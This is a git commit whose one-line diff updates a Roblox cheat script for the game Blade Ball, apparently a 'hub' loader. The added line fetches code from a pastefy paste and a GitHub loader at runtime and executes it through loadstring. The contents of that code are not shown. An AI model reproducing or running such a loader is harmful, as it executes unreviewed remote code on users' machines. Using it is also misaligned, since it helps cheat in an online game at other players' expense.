594c99f37896ce3db43b2e808c04e615e9a26a1b
Scriptsnet <maramarajadematthew@gmail.com>
2026-03-20 04:01:19 +0800

    Update HTTP requests in Argon-Hub-X-BladeBall-OP.lua

--- Argon-Hub-X-BladeBall-OP.lua
+++ Argon-Hub-X-BladeBall-OP.lua
@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/xdrGEtlI/raw"))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
